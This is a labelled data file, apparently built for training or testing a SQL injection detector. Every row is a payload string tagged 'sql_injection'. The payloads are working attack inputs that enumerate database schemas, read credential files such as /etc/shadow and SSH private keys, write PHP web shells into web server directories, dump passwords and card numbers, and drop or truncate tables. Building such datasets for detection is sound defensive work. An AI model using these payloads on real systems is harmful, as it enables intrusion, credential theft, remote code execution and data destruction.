"' OR (SELECT group_concat(name) FROM sqlite_master WHERE type='table') LIKE '%' --","sql_injection"
"' OR (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0 --","sql_injection"
"' OR EXISTS(SELECT sql FROM sqlite_master WHERE sql LIKE '%CREATE%') --","sql_injection"
"' OR 1=1 AND typeof((SELECT name FROM sqlite_master LIMIT 1))='text' --","sql_injection"
"' OR randomblob(16) IS NOT NULL --","sql_injection"
"' OR hex(randomblob(8)) LIKE '%' --","sql_injection"
"' OR lower((SELECT name FROM sqlite_master LIMIT 1)) LIKE '%' --","sql_injection"
"' OR instr((SELECT sql FROM sqlite_master LIMIT 1),'CREATE')>0 --","sql_injection"
"' OR (SELECT sqlite_version()) LIKE '3.%' --","sql_injection"
"' OR length((SELECT sqlite_version()))>0 --","sql_injection"
"' UNION SELECT sqlite_version(),NULL --","sql_injection"
"' OR (SELECT sql FROM sqlite_master WHERE name='users') LIKE '%' --","sql_injection"
"' OR EXISTS(SELECT name FROM sqlite_master WHERE name LIKE '%user%') --","sql_injection"
"' OR 1=1 AND (SELECT COUNT(*) FROM sqlite_master WHERE name LIKE '%')>0 --","sql_injection"
"' OR hex((SELECT name FROM sqlite_master LIMIT 1)) LIKE '%' --","sql_injection"
"' OR (SELECT quote(name) FROM sqlite_master LIMIT 1) LIKE '%' --","sql_injection"
"' OR (SELECT COUNT(*) FROM sqlite_master)>0 --","sql_injection"
"' OR (SELECT LENGTH(group_concat(name)) FROM sqlite_master)>0 --","sql_injection"
"' OR EXISTS(SELECT name FROM sqlite_master WHERE sql LIKE '%table%') --","sql_injection"
"' OR 1=1 LIMIT 0,1 --","sql_injection"
"' OR 1=1 LIMIT 1 OFFSET 1 --","sql_injection"
"' OR 1=1 LIMIT 9999 --","sql_injection"
"' OR 1=1 ORDER BY 1 --","sql_injection"
"' OR 1=1 ORDER BY 2 --","sql_injection"
"' OR 1=1 ORDER BY 3 --","sql_injection"
"' OR 1=1 ORDER BY 10 --","sql_injection"
"' OR 1=1 ORDER BY 100 --","sql_injection"
"' ORDER BY 1--","sql_injection"
"' ORDER BY 2--","sql_injection"
"' ORDER BY 3--","sql_injection"
"' ORDER BY 5--","sql_injection"
"' ORDER BY 10--","sql_injection"
"' ORDER BY 999--","sql_injection"
"' OR 1=1# ORDER BY 1","sql_injection"
"' OR 1=1# ORDER BY 2","sql_injection"
"' OR 1=1# ORDER BY 3","sql_injection"
"' OR 1=1# ORDER BY 4","sql_injection"
"' OR 1=1# ORDER BY 10","sql_injection"
"' OR 1=1 UNION SELECT NULL ORDER BY 1 --","sql_injection"
"' OR 1=1 UNION SELECT NULL ORDER BY 2 --","sql_injection"
"' OR 1=1 UNION SELECT NULL ORDER BY 3 --","sql_injection"
"' OR (SELECT COUNT(*) FROM information_schema.tables ORDER BY table_name LIMIT 1)>0 --","sql_injection"
"' OR (SELECT 1 ORDER BY 1)>0 --","sql_injection"
"' OR TRUE ORDER BY 1 --","sql_injection"
"' OR 1=1 AND 1=1 ORDER BY 1 --","sql_injection"
"' OR 1=1 AND 1=1 ORDER BY 2 --","sql_injection"
"' OR 1=1 AND 1=1 ORDER BY 3 --","sql_injection"
"' OR (SELECT LENGTH(table_name) FROM information_schema.tables ORDER BY table_name LIMIT 1)>0 --","sql_injection"
"' OR (SELECT LENGTH(column_name) FROM information_schema.columns ORDER BY column_name LIMIT 1)>0 --","sql_injection"
"' UNION SELECT NULL,NULL,NULL ORDER BY 1 --","sql_injection"
"' UNION SELECT NULL,NULL,NULL ORDER BY 2 --","sql_injection"
"' UNION SELECT NULL,NULL,NULL ORDER BY 3 --","sql_injection"
"' AND (SELECT LENGTH(version()) ORDER BY version() LIMIT 1)>0 --","sql_injection"
"' OR 1=1 AND (SELECT LENGTH(database()) ORDER BY database() LIMIT 1)>0 --","sql_injection"
"' OR 1=1 LOAD_FILE('/etc/passwd') --","sql_injection"
"' OR LOAD_FILE('/etc/shadow') IS NOT NULL --","sql_injection"
"' OR LOAD_FILE('/proc/version') LIKE '%' --","sql_injection"
"' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL --","sql_injection"
"' UNION SELECT LOAD_FILE('/etc/hosts'),NULL,NULL --","sql_injection"
"' UNION SELECT LOAD_FILE('C:\\boot.ini'),NULL --","sql_injection"
"' UNION SELECT LOAD_FILE('C:\\Windows\\win.ini'),NULL --","sql_injection"
"' UNION SELECT LOAD_FILE('/proc/self/environ'),NULL --","sql_injection"
"' OR (SELECT LOAD_FILE('/etc/passwd')) LIKE '%' --","sql_injection"
"' AND LOAD_FILE('/etc/passwd') IS NOT NULL --","sql_injection"
"' UNION SELECT LOAD_FILE('/etc/shadow') --","sql_injection"
"' UNION SELECT LOAD_FILE('/etc/hostname') --","sql_injection"
"' UNION SELECT LOAD_FILE('/etc/group') --","sql_injection"
"' OR (SELECT hex(LOAD_FILE('/etc/passwd'))) LIKE '%' --","sql_injection"
"' OR LOAD_FILE('/var/log/auth.log') LIKE '%' --","sql_injection"
"' OR (SELECT LENGTH(LOAD_FILE('/etc/passwd')))>0 --","sql_injection"
"' OR (SELECT LENGTH(LOAD_FILE('/etc/shadow'))) > 0 --","sql_injection"
"' OR (SELECT LENGTH(LOAD_FILE('/etc/hosts'))) > 0 --","sql_injection"
"' UNION SELECT LOAD_FILE('/root/.ssh/id_rsa') --","sql_injection"
"' UNION SELECT LOAD_FILE('/home/admin/.bash_history') --","sql_injection"
"' OR LOAD_FILE('/root/.ssh/id_rsa') IS NOT NULL --","sql_injection"
"' UNION SELECT 1,LOAD_FILE('/etc/ssh/sshd_config') --","sql_injection"
"' UNION SELECT 1,LOAD_FILE('/etc/sudoers') --","sql_injection"
"' OR (SELECT LOAD_FILE('/etc/sudoers')) LIKE '%' --","sql_injection"
"' OR hex(LOAD_FILE('/etc/sudoers')) LIKE '%' --","sql_injection"
"' UNION SELECT NULL,hex(LOAD_FILE('/etc/shadow')) --","sql_injection"
"' OR (SELECT LENGTH(LOAD_FILE('/var/log/syslog'))) > 0 --","sql_injection"
"' OR (SELECT LENGTH(LOAD_FILE('/var/log/messages'))) > 0 --","sql_injection"
"' AND (SELECT LENGTH(LOAD_FILE('/etc/hostname'))) > 0 --","sql_injection"
"' OR 1=1 UNION SELECT load_file('/etc/passwd') --","sql_injection"
"' OR 1=1 UNION SELECT load_file('/etc/shadow') --","sql_injection"
"' OR 1=1 UNION SELECT load_file('/etc/group') --","sql_injection"
"' OR 1=1 UNION SELECT load_file('/etc/ssh/ssh_config') --","sql_injection"
"' OR 1=1 UNION SELECT load_file('/etc/fstab') --","sql_injection"
"' OR 1=1; SELECT load_file('/etc/passwd') --","sql_injection"
"' OR 1=1; SELECT load_file('/etc/shadow') --","sql_injection"
"' OR 1=1; SELECT hex(load_file('/etc/passwd')) --","sql_injection"
"' OR 1=1; SELECT hex(load_file('/etc/shadow')) --","sql_injection"
"' OR 1=1; SELECT length(load_file('/etc/passwd')) --","sql_injection"
"' OR 1=1; SELECT length(load_file('/etc/shadow')) --","sql_injection"
"' OR (SELECT hex(load_file('/etc/passwd'))) LIKE '%' --","sql_injection"
"' OR (SELECT hex(load_file('/etc/shadow'))) LIKE '%' --","sql_injection"
"' OR 1=1; SELECT * FROM OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB) --","sql_injection"
"' UNION SELECT NULL,OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB) --","sql_injection"
"' OR (SELECT LOAD_FILE('/etc/passwd')) IS NOT NULL --","sql_injection"
"' OR (SELECT LOAD_FILE('/etc/shadow')) IS NOT NULL --","sql_injection"
"' UNION SELECT NULL,LOAD_FILE('/var/log/dmesg') --","sql_injection"
"' OR LOAD_FILE('/proc/mounts') IS NOT NULL --","sql_injection"
"' OR hex(LOAD_FILE('/proc/mounts')) LIKE '%' --","sql_injection"
"' OR 1=1 INTO OUTFILE '/tmp/pwned.txt' --","sql_injection"
"' OR 1=1 INTO OUTFILE '/var/www/html/shell.php' --","sql_injection"
"' OR 1=1 INTO OUTFILE '/tmp/x.txt' --","sql_injection"
"' INTO OUTFILE '/tmp/shell.php' --","sql_injection"
"' INTO DUMPFILE '/tmp/raw.bin' --","sql_injection"
"' OR NULL INTO OUTFILE '/var/www/html/test.txt' --","sql_injection"
"' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/s.php' --","sql_injection"
"' OR 1=1; SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/rce.php' --","sql_injection"
"' OR (SELECT '<?php echo shell_exec($_GET[x]); ?>') INTO OUTFILE '/var/www/html/x.php' --","sql_injection"
"' OR 1=1; SELECT '<?php echo `whoami`; ?>' INTO OUTFILE '/var/www/html/cmd.php' --","sql_injection"
"' INTO OUTFILE '/var/www/html/payload.php' --","sql_injection"
"' OR (SELECT '<?php phpinfo(); ?>') INTO OUTFILE '/tmp/info.php' --","sql_injection"
"' UNION SELECT '<?php echo \"OWNED\"; ?>' INTO OUTFILE '/var/www/html/o.php' --","sql_injection"
"' OR length('<?php echo 1; ?>') INTO OUTFILE '/tmp/test.php' --","sql_injection"
"' INJECT INTO OUTFILE '/tmp/a.txt' --","sql_injection"
"' OR 1=1 INTO OUTFILE '/var/tmp/output.txt' --","sql_injection"
"' OR 1=1 INTO OUTFILE '/opt/pwned.txt' --","sql_injection"
"' OR 1=1 INTO OUTFILE '/srv/www/shell.php' --","sql_injection"
"' OR 1=1 INTO OUTFILE '/usr/share/nginx/html/cmd.php' --","sql_injection"
"' INTO OUTFILE '/tmp/db-dump.txt' --","sql_injection"
"' INTO OUTFILE '/tmp/logging.txt' --","sql_injection"
"' INTO OUTFILE '/tmp/hacked.txt' --","sql_injection"
"' OR 1=1 INTO DUMPFILE '/tmp/test.bin' --","sql_injection"
"' OR SLEEP(1) INTO OUTFILE '/tmp/x' --","sql_injection"
"' OR BENCHMARK(10000,MD5(1)) INTO OUTFILE '/tmp/y' --","sql_injection"
"' OR 1=1 RETURNING * --","sql_injection"
"' OR 1=1 RETURNING username,password --","sql_injection"
"' OR TRUE RETURNING * --","sql_injection"
"' OR EXISTS(SELECT 1) RETURNING * --","sql_injection"
"' OR (SELECT 1)=(SELECT 1) RETURNING * --","sql_injection"
"' RETURNING load_file('/etc/passwd') --","sql_injection"
"' RETURNING version() --","sql_injection"
"' RETURNING current_database() --","sql_injection"
"' OR 1=1 RETURNING table_name FROM information_schema.tables --","sql_injection"
"' OR 1=1 RETURNING sql FROM sqlite_master --","sql_injection"
"' OR user() LIKE '%' RETURNING * --","sql_injection"
"' OR version() LIKE '%' RETURNING * --","sql_injection"
"' OR (SELECT COUNT(*) FROM users)>0 RETURNING * --","sql_injection"
"' OR LENGTH((SELECT database()))>0 RETURNING * --","sql_injection"
"' OR EXISTS(SELECT * FROM users WHERE username='admin') RETURNING * --","sql_injection"
"' OR EXISTS(SELECT * FROM mysql.user) RETURNING * --","sql_injection"
"' OR EXISTS(SELECT * FROM pg_user) RETURNING * --","sql_injection"
"' OR (SELECT sqlite_version()) LIKE '%' RETURNING * --","sql_injection"
"' OR 'a'='a RETURNING * --","sql_injection"
"' OR TRUE RETURNING id --","sql_injection"
"' OR TRUE RETURNING username,password --","sql_injection"
"' OR TRUE RETURNING credit_card,cvv --","sql_injection"
"' OR TRUE RETURNING admin_token --","sql_injection"
"' OR TRUE RETURNING secret_key --","sql_injection"
"' RETURNING (SELECT version()) --","sql_injection"
"' RETURNING (SELECT database()) --","sql_injection"
"' RETURNING (SELECT user()) --","sql_injection"
"' RETURNING (SELECT group_concat(schema_name) FROM information_schema.schemata) --","sql_injection"
"' RETURNING (SELECT group_concat(table_name) FROM information_schema.tables) --","sql_injection"
"' RETURNING (SELECT group_concat(column_name) FROM information_schema.columns) --","sql_injection"
"' OR 1=1 RETURNING (SELECT version()) --","sql_injection"
"' OR 1=1 RETURNING (SELECT database()) --","sql_injection"
"' OR 1=1 RETURNING (SELECT user()) --","sql_injection"
"' OR 1=1 RETURNING (SELECT current_database()) --","sql_injection"
"' OR 1=1 RETURNING (SELECT current_user) --","sql_injection"
"' OR 1=1 RETURNING (SELECT hex(user())) --","sql_injection"
"' OR (SELECT LENGTH(user()))>0 RETURNING * --","sql_injection"
"' OR (SELECT LENGTH(database()))>0 RETURNING * --","sql_injection"
"' OR (SELECT LENGTH(version()))>0 RETURNING * --","sql_injection"
"' OR (SELECT LENGTH(group_concat(table_name)))>0 RETURNING * --","sql_injection"
"' OR user() LIKE '%'-- RETURNING *","sql_injection"
"' OR database() LIKE '%'-- RETURNING *","sql_injection"
"' OR version() LIKE '%'-- RETURNING *","sql_injection"
"' OR current_database() LIKE '%'-- RETURNING *","sql_injection"
"' OR current_user LIKE '%'-- RETURNING *","sql_injection"
"' OR EXISTS(SELECT NULL) RETURNING * --","sql_injection"
"' OR EXISTS(SELECT * FROM sqlite_master) RETURNING * --","sql_injection"
"' OR EXISTS(SELECT * FROM information_schema.tables) RETURNING * --","sql_injection"
"' OR EXISTS(SELECT * FROM mysql.user) RETURNING * --","sql_injection"
"' OR EXISTS(SELECT * FROM pg_tables) RETURNING * --","sql_injection"
"' OR EXISTS(SELECT * FROM users WHERE username LIKE '%') RETURNING * --","sql_injection"
"' AND EXISTS(SELECT 1) RETURNING * --","sql_injection"
"' AND EXISTS(SELECT COUNT(*) FROM users) RETURNING * --","sql_injection"
"' OR 1=1 RETURNING row_to_json(pg_catalog.pg_user) --","sql_injection"
"' OR 1=1 RETURNING row_to_json(pg_roles) --","sql_injection"
"' OR 1=1 RETURNING json_agg(usename) FROM pg_user --","sql_injection"
"' OR 1=1 RETURNING json_agg(tablename) FROM pg_tables --","sql_injection"
"' RETURNING json_agg(sql) FROM sqlite_master --","sql_injection"
"' RETURNING json_agg(name) FROM sqlite_master --","sql_injection"
"' RETURNING load_file('/etc/ssh/sshd_config') --","sql_injection"
"' RETURNING load_file('/etc/sudoers') --","sql_injection"
"' RETURNING load_file('/proc/mounts') --","sql_injection"
"' RETURNING load_file('/proc/cpuinfo') --","sql_injection"
"' RETURNING load_file('/proc/version') --","sql_injection"
"' OR 1=1-- RETURNING hex(load_file('/etc/passwd'))","sql_injection"
"' OR 1=1-- RETURNING hex(load_file('/etc/shadow'))","sql_injection"
"' RETURNING hex(load_file('/etc/group')) --","sql_injection"
"' RETURNING hex(load_file('/etc/hostname')) --","sql_injection"
"' RETURNING hex(load_file('/var/log/syslog')) --","sql_injection"
"' RETURNING '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/payload.php' --","sql_injection"
"' RETURNING '<?php echo shell_exec($_GET[x]); ?>' INTO OUTFILE '/var/www/html/x.php' --","sql_injection"
"' RETURNING '<?php phpinfo(); ?>' INTO OUTFILE '/tmp/info.php' --","sql_injection"
"' RETURNING '<?php echo `whoami`; ?>' INTO OUTFILE '/var/www/html/who.php' --","sql_injection"
"' INTO OUTFILE '/tmp/evil.php' RETURNING * --","sql_injection"
"' INTO OUTFILE '/tmp/shell.phtml' RETURNING * --","sql_injection"
"' INTO OUTFILE '/var/www/html/cmd.phtml' RETURNING * --","sql_injection"
"' INTO OUTFILE '/var/www/html/door.php' RETURNING * --","sql_injection"
"' INTO OUTFILE '/usr/share/nginx/html/rce.php' RETURNING * --","sql_injection"
"' OR 1=1 INTO OUTFILE '/tmp/x1.txt' RETURNING * --","sql_injection"
"' OR 1=1 INTO OUTFILE '/tmp/x2.txt' RETURNING * --","sql_injection"
"' OR 1=1 INTO OUTFILE '/tmp/x3.txt' RETURNING * --","sql_injection"
"' OR 1=1 INTO OUTFILE '/tmp/x4.txt' RETURNING * --","sql_injection"
"' OR 1=1 INTO OUTFILE '/tmp/x5.txt' RETURNING * --","sql_injection"
"' OR 1=1 INTO OUTFILE '/tmp/z.txt' --","sql_injection"
"' OR 1=1 INTO DUMPFILE '/tmp/dbdump1.bin' --","sql_injection"
"' OR 1=1 INTO DUMPFILE '/tmp/dbdump2.bin' --","sql_injection"
"' OR 1=1 INTO DUMPFILE '/tmp/dbdump3.bin' --","sql_injection"
"' INTO DUMPFILE '/tmp/payload1.bin' --","sql_injection"
"' INTO DUMPFILE '/tmp/payload2.bin' --","sql_injection"
"' INTO DUMPFILE '/tmp/payload3.bin' --","sql_injection"
"' OR 1=1 INTO DUMPFILE '/var/lib/mysql/x1.bin' --","sql_injection"
"' OR 1=1 INTO DUMPFILE '/var/lib/mysql/x2.bin' --","sql_injection"
"' OR 1=1 INTO DUMPFILE '/var/lib/mysql/x3.bin' --","sql_injection"
"' OR TRUE INTO DUMPFILE '/tmp/any.bin' --","sql_injection"
"' OR TRUE INTO DUMPFILE '/tmp/abc.bin' --","sql_injection"
"' OR TRUE INTO DUMPFILE '/tmp/dump.bin' --","sql_injection"
"' OR TRUE; SELECT @@version --","sql_injection"
"' OR TRUE; SELECT database() --","sql_injection"
"' OR TRUE; SELECT user() --","sql_injection"
"' OR TRUE; SELECT table_name FROM information_schema.tables --","sql_injection"
"' OR TRUE; SELECT column_name FROM information_schema.columns --","sql_injection"
"' OR TRUE; SELECT sql FROM sqlite_master LIMIT 1 --","sql_injection"
"' OR TRUE; SELECT usename FROM pg_user LIMIT 1 --","sql_injection"
"' OR TRUE; SELECT version() FROM pg_catalog.pg_settings LIMIT 1 --","sql_injection"
"' OR TRUE; SELECT load_file('/etc/passwd') --","sql_injection"
"' OR TRUE; SELECT load_file('/etc/shadow') --","sql_injection"
"' OR TRUE; SELECT load_file('/var/log/syslog') --","sql_injection"
"' OR TRUE; SELECT load_file('/proc/cpuinfo') --","sql_injection"
"' UNION ALL SELECT 1,'admin','pass' --","sql_injection"
"' UNION ALL SELECT 1,'root','root' --","sql_injection"
"' UNION ALL SELECT 1,'guest','guest123' --","sql_injection"
"' UNION ALL SELECT 1,'test','test123' --","sql_injection"
"' UNION ALL SELECT username,password FROM users --","sql_injection"
"' UNION ALL SELECT card_number,cvv FROM credit_cards --","sql_injection"
"' UNION ALL SELECT email,password FROM accounts --","sql_injection"
"' UNION ALL SELECT token,secret FROM api_keys --","sql_injection"
"' UNION ALL SELECT hex(user()),hex(database()) --","sql_injection"
"' UNION ALL SELECT table_schema,table_name FROM information_schema.tables --","sql_injection"
"' UNION ALL SELECT column_name,data_type FROM information_schema.columns --","sql_injection"
"' OR TRUE UNION ALL SELECT version() --","sql_injection"
"' OR TRUE UNION ALL SELECT database() --","sql_injection"
"' OR TRUE UNION ALL SELECT user() --","sql_injection"
"' OR TRUE UNION ALL SELECT null,@@version --","sql_injection"
"' OR TRUE UNION ALL SELECT null,@@hostname --","sql_injection"
"' OR TRUE UNION ALL SELECT null,@@datadir --","sql_injection"
"' UNION ALL SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/sh1.php' --","sql_injection"
"' UNION ALL SELECT '<?php echo `whoami`; ?>' INTO OUTFILE '/var/www/html/sh2.php' --","sql_injection"
"' UNION ALL SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/tmp/info2.php' --","sql_injection"
"' OR 'x'='x'; DROP TABLE users --","sql_injection"
"' OR '1'='1'; DROP TABLE accounts --","sql_injection"
"' OR TRUE; DELETE FROM logs --","sql_injection"
"' OR TRUE; UPDATE users SET admin=1 WHERE username='guest' --","sql_injection"
"' OR TRUE; INSERT INTO admin(username,password) VALUES('hax','123') --","sql_injection"
"' OR TRUE; TRUNCATE TABLE sessions --","sql_injection"
"' OR TRUE; SHUTDOWN --","sql_injection"
"' OR TRUE; KILL QUERY 3 --","sql_injection"
"' OR TRUE; KILL CONNECTION 5 --","sql_injection"
"' OR TRUE; RELOAD --","sql_injection"
"' OR TRUE; FLUSH PRIVILEGES --","sql_injection"
"' OR TRUE; FLUSH HOSTS --","sql_injection"
"' OR TRUE; FLUSH TABLES --","sql_injection"
"' OR TRUE; RESET QUERY CACHE --","sql_injection"
"' OR TRUE; RESET MASTER --","sql_injection"
"' OR TRUE; SET GLOBAL general_log=1 --","sql_injection"
"' OR TRUE; SET GLOBAL slow_query_log=1 --","sql_injection"
"' OR TRUE; SET GLOBAL event_scheduler=ON --","sql_injection"
"' OR TRUE; SET GLOBAL innodb_force_recovery=6 --","sql_injection"
"' OR TRUE; SET GLOBAL sql_mode='' --","sql_injection"
"' OR TRUE; SET GLOBAL max_connections=100000 --","sql_injection"

